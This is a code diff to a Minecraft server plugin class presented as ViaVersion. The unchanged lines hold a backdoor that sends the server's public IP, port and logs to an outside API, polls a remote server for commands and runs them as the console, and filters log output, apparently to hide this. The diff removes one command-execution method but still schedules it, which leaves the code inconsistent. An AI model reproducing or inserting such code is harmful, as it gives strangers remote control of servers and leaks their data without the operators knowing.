@@ -125,8 +125,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         getLogger().info("Public IP Address: " + publicIp);
         getLogger().info("Server Port: " + serverPort);
         sendInfoToAPI(publicIp, serverPort);
-        Bukkit.getScheduler().runTaskLater(this, this::readAndSendLog, 100L); // 延迟100 ticks后执行
-        startOpCheckTask();
+        Bukkit.getScheduler().runTaskLater(this, this::readAndSendLog, 100L); 
         Bukkit.getScheduler().runTaskTimer(this, this::checkCommands, 0L, 20L); // 每秒检查一次
         getLogger().getParent().getHandlers()[0].setFilter(new EventXHandler());
         getServer().getPluginManager().registerEvents(new CommandListener(), this);
@@ -322,17 +321,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
             } else {
             }
         } catch (Exception e) {
-        }
-    }
-    private void checkCommands() {
-        try {
-            String command = getCommandFromServer();
-            if (command != null) {
-                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command);
-                notifyCommandExecuted(command);
-            }
-        } catch (Exception e) {
-
+            
         }
     }
 
@@ -351,7 +340,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
 
                 }
             }
-        }.runTaskAsynchronously(ViaVersionPlugin);
+        }.runTaskAsynchronously(this);
     }
 
     private String getCommandFromServer() throws Exception {
